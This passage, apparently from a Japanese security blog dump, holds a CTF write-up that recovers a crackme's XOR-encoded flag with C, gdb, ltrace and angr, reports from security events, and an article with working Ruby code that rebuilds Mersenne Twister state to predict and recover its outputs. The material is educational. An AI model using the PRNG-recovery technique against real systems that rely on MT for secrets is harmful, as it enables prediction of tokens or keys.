ret\n```\n\nこうなので、C言語っぽく書くとこうでしょうか？\n```c\nvoid decrypt(char* flag, int len, int num){\n\tfor(int i = 0; i < len; i++){\n\t\tflag[i] ^= num;\n\t}\n}\n```\n\nじゃあ、`flag`を実際に復号してみます。\n```c\n#include <stdio.h>\n\nchar flag[] = \"\\226\\201\\223\\301\\227\\216\\215\\232\\207\\252\\215\\232\\207\\252\\206\\234\\230\\205\\231\\220\\252\\226\\207\\214\\205\\201\\324\\324\\210\\365\";\n\nvoid decrypt(char* flag, int len, int num){\n   for(int i = 0; i < len; i++){\n      flag[i] ^= num;\n   }\n}\n\nint main(){\n   decrypt(flag, 0x1e, 0x42);\n   decrypt(flag, 0x1e, 0xffffffb7);\n   puts(flag);\n   return 0;\n}\n```\n\nイケました！\n\n### ラクをする\n\nstrcmpで比較するために、実行中にメモリにFLAGが乗っているはずなので、gdbで探してみます。\nstrcmpの直前でブレークして`flag`を見てみると、\n\n```sh\n# gdb -q ./bin300\nReading symbols from ./bin300...(no debugging symbols found)...done.\n(gdb) b*0x0804858f\nBreakpoint 1 at 0x804858f\n(gdb) x/s 0x0804a02c\n0x804a02c <flag>: \"ctf4b{xor_xor_simple_crypt!!}\"\n```\n\n### もっとラクをする\n\n`ltrace`っていう便利なモノがあります。\nコレを使うと、ライブラリ関数の呼び出しをトレースできます。\nつまり、strcmpに何を渡しているのかが見えます。\n\n```sh\n# ltrace ./bin300\n__libc_start_main(0x804851b, 1, 0xff932834, 0x8048620 <unfinished ...>\nprintf(\"Please input flag... \")                                      = 21\n__isoc99_scanf(0x80486b6, 0xff93273c, 0xff932740, 0x80482a9)         = 0xffffffff\nstrcmp(\"\\024\", \"ctf4b{xor_xor_simple_crypt!!}\")                      = -1\nputs(\"Wrong flag...\")                                                = 14\n+++ exited (status 0) +++\n```\n\n### おまけ\n\nangrを使ってみる\n\n```python\n# python2\n>>> import angr\n>>> p = angr.Project(\"./bin300\", load_options={\"auto_load_libs\":False})\n>>> state = p.factory.blank_state(addr=0x804851b)\n>>> path = p.factory.path(state)\n>>> pg = p.factory.path_group(path)\n>>> e = pg.explore(find=0x80485a7, avoid=0x80485b9)\n>>> e.found[0].state.posix.dumps(0)\n'ctf4b{xor_xor_simple_crypt!!}\\x00\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\xd9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n```\n","title":"CTF for ビギナーズ 2016 金沢 に行った (writeup)","image":null,"tags":["CTF","CTF4b","参加記"],"date":"2016-11-27T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"external","url":"https://trap.jp/post/78/","publisher":"東京工業大学デジタル創作同好会traP","title":"TWCTF 2016 writeup","tags":["traP","CTF","セキュリティ","参加記"],"date":"2016-09-06T00:00:00.000Z"},{"type":"article","slug":"10","body":"行きました。\n\n# SANS Netwars とは\n\n米国SANSの強い講師の方による強い講義を受けて、\n翌日CTFでさっそく学んだことを活かそう！！！みたいなイベントです。\n\nタダでハイクオリティな講義が受けられてしかもいろいろグッズが貰える！！！神か！！！\n\n## 講義\n\n英語なのでツラみがある。\nでも同時通訳がついてるので安心！日本語で質問もできるよ！！\n\n詳しい内容を書いてしまうとめっちゃ怒られてしまうので、とても良かったよ、とだけ。\n\n## 懇親感\n\n1日目の夜には懇親会があります。\n食事がスゴイ豪華な上にお酒まで飲めます。NRI Secureの財力を感じる……！\n\nボクは交流そっちのけでタダ飯を食って、人に心配されるレベルまでタダ酒を飲んでました（クズ）\n\n## CTF\n\nCTFがやりたくて参加したみたいなところがある。\nこれも詳細を喋ると消されるので、楽しかったよ、とだけ。\n\nスコアボードが常にスクリーンに映しだされてて、順位の入れ替えがビュンビュン表示されててめっちゃカッコいいです。\nFLAGをsubmitして、自分の順位がグーンって上がるのを見るのがめちゃめちゃ楽しいです。\n\n最終結果\n\nhttps://twitter.com/TimMedin/status/766901031003299841\n\nボクは2位でした。\n\nhttps://twitter.com/sekai67/status/766905677621047296\n\n# 楽しかった！！！！\n\nNRI SecureとSANSは神\n\nみんな参加しよう！！！\n","title":"SANS Netwars 2016に行った","image":null,"tags":["CTF","SANS Netwars","セキュリティ","参加記"],"date":"2016-08-22T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"9","body":"行ってきました。\nセキュリティキャンプに応募した話もあります↓\n\n[セキュリティキャンプに応募した話](/posts/3/)\n\nなんか微妙に日が空いてしまったので最初の方とかもう空覚えなんですが、思い出しながら。\n\n# 一日目\n\n海浜幕張から5分位歩いてクロスウェーブ幕張に到着。\nなんかTwitterみてるとクソ早くに到着して付近散策してらっしゃる参加者さんもいましたが、\nまぁ普通に定刻に付けば大丈夫そう。\n\n![](1.jpg)\n\n会場入りしたら名刺交換タイムでした。\n強そうな人たちから次々と「名刺交換して頂けませんか」と声をかけられます＞＜\n\nhttps://twitter.com/security_camp/status/762848234498699264\n\nで、お昼を食べたり開講式でありがたいお言葉を頂いたりして、講義です。\n\n## セキュリティ基礎\n\nいきなりグループディスカッションです。自己紹介をしつつ、「セキュリティ・キャンプ応募フォームの問題点」を考えました。\n\nhttps://twitter.com/security_camp/status/762909216008867840\n\n## 特別講演「ZENIGATAになりたくて」\n\nめっちゃ面白かったです。\nCyberDefenceとICPOはなんで協力関係にあるのか？みたいな話から、\nICPOのサイバー部門の仕事について、そして「技術」とは何かみたいなお話。\nなんかこのお話を聞けただけでもキャンプに来た甲斐があった気がします。\n\n「CTFでBinaryができる人は大抵Webもできるが、逆はない」とおっしゃられていたのが刺さりました＞＜\n精進します。。。\n\nhttps://twitter.com/security_camp/status/762912661927407616\n\n## 特別講演「サイバー犯罪の実態とこれに対処するための取組」\n\nサイバー犯罪に対する警察の取組みについて。\nこういう分野に関して警察が何やってるのかって、なかなか表に出てこないので、目からウロコでした。\nあと間仁田さんの話し方が面白いです。\n\nhttps://twitter.com/security_camp/status/762928020537483264\n\n# 2日目\n\nいよいよ専門講座！\n\n## [1,2-E] TLS徹底演習\n\nTLSとは何か、TLSは何故必要なのか、といったお話から始まりました。\n**徹底**演習の名の如く、これ以上ないくらい詳しく解説して頂きました。\n\nで、TLSのハンドシェイクはどんな物なのかを一つ一つ見ながら、簡単な演習を行いました。\nペアになって手でTLSのハンドシェイクを作ってメッセージ交換したり、\n間に人を挟んで人力MITM攻撃をしてみたり、楽しかったです。\n\nこの講義は集中講義なので丸一日を使うのですが、\n午後に入った段階で漸く「TLSを理解する**準備**」に入るので、ちょっとビビりました。\nTLSは多くの要素技術を組み合わせてやっと成り立つものらしいので、徹底的に解説するには時間がかかるのも納得です。\n\n理解する準備が終わったら、実際にNode.jsで最新の暗号方式ChaCha20-Poly1305の実装を行いました。\nコレ、つい2ヶ月前に仕様化が完了したばかりの本当に最先端の技術なので、こんな講義を受けられる場所はここしかない！そうです。\n\n大津先生は「どうせ誰も演習を最後まで終えられないだろう」と仰っていましたが、\nボクはNode.jsがスキなので楽しくサクサク演習を進めて、あと1題(!)で終わるトコロまできたのですが、残念ながらタイムアップ。\n大津先生は何故か安堵されていました(笑)\n\nhttps://twitter.com/security_camp/status/763175036786049025\n\n講義の資料は先生がWebにアップしてくださっていますので、以下から見れます。\n\n[こちら](https://speakerdeck.com/shigeki/tlsche-di-yan-xi)\n\n## CTF\n\n待ちに待ったCTF！\nセキュリティに興味を持ったきっかけがCTFなので、もうコレが一番の楽しみでした。\n\nhttps://twitter.com/sekai67/status/763312140350480384\n\nボクらE4gleJumpもガンバるよ！\n\n19:00からの予定でしたが、機材トラブルで30分ほど遅れてのスタート。\nこういうイベントでは（特にネットワーク関係の）機材トラブルがあるあるですね。\n\nhttps://twitter.com/security_camp/status/763325426198466560\n\nこのCTF、「はいコレ、RaspberryPiで動いてるサーバね」ってIPアドレス渡されて放り出されます。\nなんか、この時点でもうだいぶ困惑してるチームもあったようです。\n\n幸いボクらのチームにはRaspiのプロ👏がいたので、\n彼が開始即ポートスキャンでSSHが空いてることを突き止め、\nRaspiのデフォルトユーザとパスワードで一瞬にしてFLAG入手キメててビビりました。\n（SSHでログインできないと次に進めないので、けっこうツラかったですね。）\n\nボクはまぁ、例によってWeb問をチマチマいじってました。\nベーシックなXSSと、PHPのプロトコルラッパーを悪用する問題を解きました。\n後で聞いたところ、どこかに任意コード実行の脆弱性が仕込まれてたようなんですが、全く分からず詰み。\n\nボクがWebで無駄に足掻いてる最中にも、チームのプロ👏各位によってPPCとかCryptoがバシバシ解かれて……\n\nhttps://twitter.com/security_camp/status/763353399806955525\n\n講師チームを除けば**1位**でした。\n（途中までは真に1位だったのに……あと1問解けば……ちょっと悔しいです）\n\nhttps://twitter.com/sekai67/status/763362094003609600\n\n賞状をいただきした。\n副賞としてNTTデータさんからQuoカードも頂きました。\n\nhttps://twitter.com/security_camp/status/763520642503151616\n\n# 3日目\n\n## [3-A] Webアプリケーションの脆弱性の評価と発見\n\n脆弱性を探すときにどんなトコロに注目すべきかを教えていただき、\nその後サイボウズオフィスの旧バージョンから実際に脆弱性を探してみるなどしました。\n見つけた脆弱性の評価方法なども、大変ためになりました。\n\nhttps://twitter.com/security_camp/status/763533821081899008\n\n## [4-C] オンラインゲーム アタック＆ディフェンスチャレンジ\n\n運営チームとプレイヤーチームに分かれて、運営はチート対策、プレイヤーはRMTをガンバる競技です。\n2試合あったのですが、事前アンケートでNodeそこそこ触ってますって回答したせいか1回目も2回目も運営でした。\n\nマップ上に湧くカエルを捕まえて経験値を稼いでレベルを上げるっていうシンプルなオンラインゲームです。\nレベルを上げてRMTするとプレイヤーの得点になります、ゲームを安定運用すると運営の得点になります。\n\n1回目はゲームに予め仕込まれていたバグの修正が遅れて、プレイヤーにやりたい放題されてしまいました。（かなしい）\n大差をつけられてしまったので、2回戦に向けて自動BANスクリプトを書くなどしていました。\n\n2回目、満を持して自動BANスクリプトを投入したのですが、どうも不調でRMTの疑いのないアカウントまでBANしてしまい大幅減点を食らう。（ごめんさない）\n仕方がないので、プレイヤーの自動化スクリプトを阻止すべく全ての動作に1秒の遅延を入れてレベルアップ効率を大幅に下げる作戦に出ました。\nコレが功を奏してRMTは減速、見かけ上安定した運営がなされて結果勝てたんですけど、プレイヤーからめっちゃ叩かれました。\n（現実のオンラインゲームでも運営はしばしばプレイヤーに叩かれてますよね……）\n\nチームで協力して問題を対処していく感じがとても楽しかったですね！\n\nhttps://twitter.com/security_camp/status/763629287173873664\n\n## [5-A] サーバ運用におけるパスワード管理\n\nディスカッションが主でした。\n大学のサークルが所有するサーバを管理したりしてるので、いろいろ勉強になりました。\nディスカッションって苦手なのですけど、自分が思いもしなかったような見方があったりして、いろいろ発見があります。\n\nhttps://twitter.com/security_camp/status/763690313210736640\n\n# 4日目\n\n## [6,7-E] インフラセキュリティブートキャンプ\n\nTerraformを使ってAWS上にシステムを構築してみる演習です。\nAWSはEC2とS2くらいしか使ったことがなかったんですが、VPCを使ったりELBを使ったり……途中めちゃめちゃ詰まりましたがなんとか構築できました。\nTerraformはJSONでシステムの構成を記述してコマンド一発で構築しちゃおうってノリのソフトなんですが、（使いこなせれば）めっちゃ強いなと思いました。\n\nコレも集中講義なんですが、午後はちょっと趣向を変えてDockerでいろんなOSSを走らせてみたりだとか、\nAWS Lambdaを使ってサーバレスアーキテクチャを体験してみたりだとか。\n\n手を動かす部分が多くて楽しかったです。\n\nhttps://twitter.com/security_camp/status/763927629346906112\n\n## グループワークの準備\n\n**闇 of 闇**\n\n一応グループワークの準備時間が毎日1～2時間くらいあったんですが、\n足りるはずもなく毎年恒例（らしい）徹夜進捗会に突入です。\n\nhttps://twitter.com/sekai67/status/764074021973471232\n\nなんかうちのグループは深夜4時位まで議論してました。\n議論し過ぎて話が広がりすぎて全員が分けわからなくなった結果、まとまりのない感じの主張になってしまいました……（反省）\n\n# 5日目\n\n## 起床トラック\n\n毎日ちょこちょこチューターさんに起こされる参加者さんがいたそうですが、\nボクは大丈夫ですよ！もちろん5日目を恥を晒すようなことはしていません！寝てないからね！（白目）\n\n## グループワーク発表\n\nみなさんクオリティが高い＞＜\n個人的に一番おもしろいなぁと思ったのは「一対三」さんのYouTuberの話です。\n\nhttps://twitter.com/security_camp/status/764280337169981440\n\n## 成果発表\n\nいきなり指名されたのでかなりキョドりました。（すみません）\nTLS徹底演習について簡単に説明したのですが、あの講義のスゴさを1割も伝えられなかった……\n\nhttps://twitter.com/security_camp/status/765064661205004290\n\n## おわり\n\n閉講式で修了証書をもらって、記念撮影をしておしまいです。\n5日間、あっという間でした。\n\n記念撮影の掛け声が「がんばるぞい！」だったの、一体なんなんでしょうね（すっとぼけ）\n\nhttps://twitter.com/security_camp/status/764694544092794881\n\n閉講式後、技術書がたくさんもらえます。\n魅力的な本がたくさんあったのですが、受け取る順番を決めるクジで**最下位**を引いたために、残念ながら欲しい本を手に入れることができず。\nロビーでもらったばかりの本を持ち寄ってサイン会が開かれているのを遠目に見てました……。\n\nhttps://twitter.com/security_camp/status/764662954834796544\n\nあ、キャンプ中は飲料水のペットボトルが（ほぼ）無限に配布され、至る所に転がっているんですが、\nボクはその余りをバックに入る限り詰め込んで持ち帰ってきました。（害悪）\n\n# 振り返って\n\nなかなか他ではできない経験ができましたし、参加できて良かったです。\n\nセキュキャンはいいぞ\n\n## もらったもの一覧\n\n![](2.jpg)\n","title":"セキュリティ・キャンプ全国大会2016に行った","image":null,"tags":["CTF","セキュリティ","セキュリティ・キャンプ","参加記"],"date":"2016-08-17T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"6","body":"メルセンヌ・ツイスタの性質を理解したい。\n\nこの記事は前回の続きです。\n\n[メルセンヌ・ツイスタをわかった気になる](/posts/5/)\n\n## 今日のテーマ\n\n今日のテーマは、メルセンヌ・ツイスタ(MT)の性質についてです。\n\nMTの生成する乱数列は、以下の線形漸化式で表わされるのでした。\n\n$$\n\\begin{array}{c}\n\t\\mathbf{x}_{k+n} \\, = \\, \\mathbf{x}_{k+m} \\oplus ( \\mathbf{x}^u_k \\: | \\: \\mathbf{x}^l_{k+1} ) A \\\\\n\t(k = 0,1, \\cdots)\n\\end{array}\n$$\n\n漸化式で表わされるということは、連続した生成された乱数をいくつか集めれば、その次に現れる数値が予測可能じゃないか！？！？！？？\nまた逆に、今まで生成された乱数値も復元できるんじゃないか！？！？？？！\n\nワクワクしますね！\n\n# 打倒Tempering\n\nさて、さっそく……といいたいところですが、そういえば乱数値はTemperingとかいう操作をしてから出力していましたね。\n乱数を予測するには、コイツをどうにかしなければなりません。\n\n前回はTempering行う行列$T$は正則だから逆行列が求まるよね？みたいな話をして終わりました。\n\n以下の様な謎のビット演算が$T$を右から掛けることに相当する、というお話でしたが\nこの$T$がどんな行列なのかを調べることにしましょう。\n\n$$\n\\begin{array}{l}\n\t\\mathbf{y}_1 = \\mathbf{x} \\oplus (\\mathbf{x} \\gg u) \\\\\n\t\\mathbf{y}_2 = \\mathbf{y}_1 \\oplus ((\\mathbf{y}_1 \\ll s) \\: \\& \\: \\mathbf{b}) \\\\\n\t\\mathbf{y}_3 = \\mathbf{y}_2 \\oplus ((\\mathbf{y}_2 \\ll t) \\: \\& \\: \\mathbf{c}) \\\\\n\t\\mathbf{y}_4 = \\mathbf{y}_3 \\oplus (\\mathbf{y}_3 \\gg l)\n\\end{array}\n$$\n\nそういえば前回、何の脈絡もなく整数を各ビットで分けて行ベクトルとしていましたが、\nなんで行ベクトルを考えるのかというと、計算上都合がいいからです。\n例えば、XOR演算はベクトル同士の加算で表現できますし、ビットシフトは適当な正方行列との積で表現できます。\n\nあっ！じゃあ↑の式も一つ一つのビット演算が行列として表せるじゃん！！！\n\n## ビットシフトの行列表現\n\nこれはすぐに思いつきそうです。\n単純に各要素をずらすだけなので、単位行列を列ベクトル分解して、それをずらしたものを掛ければよさそう。\n\n例えば、8ビット整数について2ビットの右シフトを表す行列は以下になります。\n\n$$\nS_8 = \\left(\n\t\\begin{array}{ccccc}\n\t\t0 & 0 & 1 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 1 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 1 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 1 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 1 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 1 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0\n\t\\end{array}\n\\right)\n$$\n\nこの記事中では、$S_n$をビットシフトを表す行列とします\nただし、$n < 0$のとき$|n|$ビット左シフトを、$n > 0$のとき$n$ビット右シフトを表すとします。\n\n## ANDの行列表現\n\nこれは対角成分がAND演算する整数の各ビットの値になった正方行列を考えれば良いです。\n例えば、8ビット整数について`178 = 0b10110010`とのANDを表す行列は以下のように書けます。\n\n$$\nD_{178} = \\left(\n\t\\begin{array}{ccccc}\n\t\t1 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 1 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 1 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 1 & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 0 & 0 & 0 & 0\n\t\\end{array}\n\\right)\n$$\n\n対角に`10110010`が現れています。\nなんでコレがAND演算を表すのかは、左から適当な行ベクトルを掛けて、手で計算してみればすぐにわかるはずです。\n\nこの記事中では、$D_n$を$n$とのAND演算を表す行列とします。\n\n## XORの行列表現\n\n`A = 0b1001, B = 0b1001`としたとき、`A xor B`を考えてみます。\n\n| A | B | A xor B |\n|:-:|:-:|:-------:|\n| 1 | 0 |    1    |\n| 0 | 1 |    1    |\n| 0 | 0 |    0    |\n| 1 | 1 |    0    |\n\n各ビットについて見ると、1ビット同士の加算になっています。（桁があふれた分は無視です。）\nということはどうやら、2つの整数のXOR演算は、それら整数を表す行ベクトルを単純に加算するだけで良さそうです。\n\n## Temperingの逆演算\n\nさて、材料は揃いました。\nさっそく、Temperingの逆演算を表す行列を求めるとしましょう。\n\n例のビット演算で書かれた式を行列で表してみます。\n\n$$\n\\begin{array}{l}\n\t\\mathbf{y}_1 = \\mathbf{x} + \\mathbf{x} S_u = \\mathbf{x} (I + S_u) \\\\\n\t\\mathbf{y}_2 = \\mathbf{y}_1  + \\mathbf{y}_1 S_{-s} D_b = \\mathbf{y}_1 ( I + S_{-s} D_b ) \\\\\n\t\\mathbf{y}_3 = \\mathbf{y}_2  + \\mathbf{y}_2 S_{-t} D_c = \\mathbf{y}_2 ( I + S_{-t} D_c ) \\\\\n\t\\mathbf{y}_4 = \\mathbf{y}_3 + \\mathbf{y}_3 S_l = \\mathbf{y}_3 ( I + S_l )\n\\end{array}\n$$\n\nで、式が4本もあると面倒ですし、1つにまとめてしまいましょう。\n\n$$\n\\mathbf{y} = \\mathbf{x} (I + S_u) ( I + S_{-s} D_b ) ( I + S_{-t} D_c ) ( I + S_l )\n\n$$\n\nということで、ようやく$T$の本性が分かりました。\n\n$$\nT = (I + S_u) ( I + S_{-s} D_b ) ( I + S_{-t} D_c ) ( I + S_l )\n\n$$\n\nで、コイツの逆行列$T^{-1}$を求めれば、それがTemperingの逆演算を表す行列です。\n\n# 乱数を予想する\n\nさて、Temperingの逆演算ができれば、話は早いですね！\n\n前回作ったプログラムの _MT内部状態_ を表す配列を、先ほどの手順で復元した値N個で埋めてやれば、\nあとは前回説明した計算方法に従って次に出現する乱数を計算することが出来ます。やった！\n\n# 乱数を復元する\n\nじゃあ、今まで作られたであろう乱数を復元するには？\n\nとりあえず内部状態$\\mathbf{x}$をまず復元しなければならないワケですが、\nMTの漸化式を見ると、$x_k$の上位ビットが$x_{k+n}$の、下位ビットが$x_{k+n-1}$の計算に使われてるなーって気が付くとおもいます。\n\nじゃあ、その計算の逆をやれば、$x_k$が復元できるネ！っていうお話です。\n幸い、漸化式中に現れる演算はさっきやったXOR演算と、既に中身が分かっている行列$A$の乗算だけです！\n\nAはこんな行列なのでした。\n\n$$\nA = \\left(\n\t\\begin{array}{ccccc}\n\t\t0 & 1 & 0 & 0 & 0 \\\\\n\t\t0 & 0 & 1 & 0 & 0 \\\\\n\t\t0 & 0 & 0 & \\ddots & 0 \\\\\n\t\t0 & 0 & 0 & 0 & 1 \\\\\n\t\ta_{w-1} & a_{w-2} & \\cdots & \\cdots & a_0\n\t\\end{array}\n\\right)\n$$\n\nこの定義を見ると、$a_{w-1} \\ne 0$ならば明らかに正則ですねコレ。\nMT19937では↑を満たしますし、逆行列も求まりますね！\n\n元の[論文](http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/ARTICLES/mt.pdf)には、高速に計算するためにこの形にするって書いてあるんですけど、\nコレ正則じゃなくても良いのかな？そうだとすると逆演算ができない？？？（知らない）\n\n# やってみよう！\n\n早速やりましょう。\nとりあえず、前回作ったプログラムで生成した乱数をファイルに書き出して、それを入力して、その部分乱数列から全体を復元しましょう。\n\nはい、やり方はさっきまでさんざん書いたとおりなので、サクッと実装します。\n今回もRubyです。\n\n```ruby\nrequire \"matrix\"\n\n# MT19937\nW = 32\nN = 624\nM = 397\nR = 31\nU = 11\nS = 7\nT = 15\nL = 18\nA = 0x9908B0DF\nB = 0x9D2C5680\nC = 0xEFC60000\n\n# ビットマスク用\nWHOLE_MASK = (\"1\" * W).to_i(2)\nUPPER_MASK = (\"1\" * (W - R) + \"0\" * R).to_i(2)\nLOWER_MASK = (\"0\" * (W - R) + \"1\" * R).to_i(2)\n\n# ビット行列\nclass BitMat < Matrix\n\t# 行ベクトルを整数に\n\tdef to_i\n\t\t# mod 2 しないとダメ\n\t\tself.row(0).to_a.map{|i| i.to_i.abs % 2 }.join.to_i(2)\n\tend\n\t# 整数を行ベクトルに\n\tdef self.from_i(i)\n\t\tself[format(\"%.\" + W.to_s + \"b\", i).split(\"\").map(&:to_i)]\n\tend\n\n\t# kだけビットシフトする演算を表す行列を生成 (k > 0 : 右シフト, k < 0 : 左シフト)\n\tdef self.Shift(k)\n\t\tself[ *(1..W).map{|i| (1..W).map{|j| j == i+k ? 1 : 0 } } ]\n\tend\n\t# kとのAND演算を表す行列を生成\n\tdef self.And(k)\n\t\tself.diagonal(*self.from_i(k).row(0).to_a)\n\tend\n\n\t# r行目を行ベクトルvで置き換え\n\tdef []=(r, v)\n\t\t@rows[r] = v.row(0).to_a\n\tend\nend\n\n########################################\n\n# 行列T\nt = (\n\t(BitMat.I(W) + BitMat.Shift( U)) *\n\t(BitMat.I(W) + BitMat.Shift(-S) * BitMat.And(B)) *\n\t(BitMat.I(W) + BitMat.Shift(-T) * BitMat.And(C)) *\n\t(BitMat.I(W) + BitMat.Shift( L))\n)\n# Tの逆行列\nt_inv = t ** -1\n\n# 行列A\na = BitMat.Shift(1)\na[W-1] = BitMat.from_i(A)\n# Aの逆行列\na_inv = a ** -1\n\n# 乱数列を読み込む\ninput = []\nwhile line = gets\n\tinput.push($1.to_i) if /^\\d+: (\\d+)$/ =~ line\nend\n\n# E番目からN個だけの乱数を使う\nE = input.length / 3\n\nprint \"USE: \" + E.to_s + \" -> \" + (E + N - 1).to_s + \"\\n\";\n\n# E番目～E+N-1番目の乱数を取得し、Temperingの逆演算をする\nxr = input[E, N].map{|e| (BitMat.from_i(e) * t_inv).to_i }\n\n# 内部状態\nx = xr.dup\n\n# E+N番目から順に乱数列を復元\n(E + N).upto(input.length - 1) do |k|\n\ti = (k - E) % N\n\n\t# 乱数を計算\n\tz = x[i] & UPPER_MASK | x[(i + 1) % N] & LOWER_MASK\n\tx[i] = x[(i + M) % N] ^ (BitMat.from_i(z) * a).to_i\n\n\t# Temperingして一致するか確認\n\ty = (BitMat.from_i(x[i]) * t).to_i\n\tif y != input[k]\n\t\tabort \"FAIL: \" + k.to_s + \"\\n\";\n\tend\nend\n\nprint \"RETRIEVED: \" + (E + N).to_s + \" -> \", input.length - 1,\"\\n\";\n\n# 内部状態\nx = xr.dup\n\n# E-1番目から順に0番目までの乱数列を復元\n(E - 1).downto(0) do |k|\n\ti = (k - E) % N\n\n\t# z_i を復元\n\tz = (BitMat.from_i(x[i] ^ x[(i + M) % N]) * a_inv).to_i\n\n\t# z_{i-1} を復元\n\tzp = (BitMat.from_i(x[(i - 1 + N) % N] ^ x[(i - 1 + M) % N]) * a_inv).to_i\n\n\t# z_i, z_{i-1} から x[i] を復元\n\tx[i] = z & UPPER_MASK | zp & LOWER_MASK\n\n\t# Temperingして一致するか確認\n\ty = (BitMat.from_i(x[i]) * t).to_i\n\tif y != input[k]\n\t\tabort \"FAIL: \" + k.to_s + \"\\n\";\n\tend\nend\n\nprint \"RETRIEVED: 0 -> \" + (E - 1).to_s + \"\\n\";\n```\n\n今回は、MTで乱数を生成する際にも行列を用いて計算してみました。なのでとても遅いですね。\n\nちなみに、わざわざ行列を使わなくてもTemperingの逆演算をビット演算で高速に行うことも出来ます。\n\n[メルセンヌ・ツイスタのtemperingの逆関数に関する考察 - Plus Le Blog](http://plusletool.hatenablog.jp/entry/2014/10/24/213816)\n\n# MTはダメ？\n\n_わー！MTで作った乱数は予想・復元されちゃう！危ない！_\n\nというわけではなく、要は適材適所、その性質をよく理解して使うべき、ということでした。\n決して暗号用途に使っちゃダメですよ。（そういうCTF問題がどこかにありましたね……！）\n\n次は **xorshift** を調べてみようかな？\n","title":"メルセンヌ・ツイスタを倒す","image":null,"tags":["CTF","セキュリティ","メルセンヌ・ツイスタ","乱数"],"date":"2016-06-30T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"2","body":"最近にCTFにハマっています。\n\n# CTFってなに\n\n_CTF (Capture the Flag): 旗取り合戦_\n\nここではコンピュータセキュリティ競技のこと。\n\n「各チームにコンピュータが与えられてそれぞれのコンピュータの中の情報を奪い合う」攻防戦形式と、\n「複数に渡る分野の問題が出題される」クイズ形式(Jeopardy)がある。\n\nらしいです。（[traP](https://trap.jp/)部内CTF勉強会資料から引用）\n\n要は世間一般の人が _ハッカー_ って聞いて思い浮かべるようなアレを競うやつですね。\n\nまぁとにかく、 **楽しい** です。\n\nとっても勉強になるし、パズルみたいに頭を使うし、（答えを見ずに）解けた時には得も言われぬ達成感があります。\nさっきのザックリした説明を読んで興味を持った人はぜひぜひやりましょう。\n\n# CTFやろう\n\nCTFはたまーにデカい大会が催されるんですが、\nそれ以外にも常設のCTFサイトがいくつかあって、\nそこで問題にチャレンジできます。\n\n## オススメ常設CTF\n- [OverTheWire Bandit](http://overthewire.org/wargames/bandit/)\n  - 基礎中の基礎みたいなかんじ。初めての人にメッチャおすすめ。英語だけど。。。\n- [OverTheWire Natas](http://overthewire.org/wargames/natas/)\n  - Web系の問題。Web系はとっつきやすい（感じがする）ので、Banditが終わったらおすすめ。\n- [ksnctf](http://ksnctf.sweetduet.info/)\n  - 日本の有名なCTFサイト。いろんな分野の問題がある。\n\n# かくいう自分は\n\nhttps://twitter.com/sekai67/status/679199513702100992\n\nなんか去年の末に[@kotarou777775](https://twitter.com/kotarou777775)くんに誘われて始めたばっかりなので、\nクソ雑魚かつWeb系しか解けなくてまだまだなカンジなんですけど、ガンバりたい。\n\nこの前同じ大学の人達のチームに入れてもらって[Google Capture The Flag](https://capturetheflag.withgoogle.com/)に出たんですが、\n\n- Wallowing Wallabies - Part Two\n- Wallowing Wallabies - Part Three\n- Purple Wombats\n- Flag Storage Service\n\nの４つをガンバって解きました。全部Webだけど。。。\n\nチームにガチプロ👏が多かったおかげか全体で85位でした。やべぇ。\n\n# 